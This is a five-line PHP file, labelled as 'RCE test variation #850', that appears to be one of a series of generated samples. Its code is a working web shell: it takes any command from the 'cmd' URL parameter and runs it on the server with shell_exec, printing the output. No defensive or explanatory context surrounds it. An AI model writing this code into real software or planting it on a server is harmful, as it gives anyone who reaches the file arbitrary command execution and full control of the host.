<?php
// RCE test variation #850
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>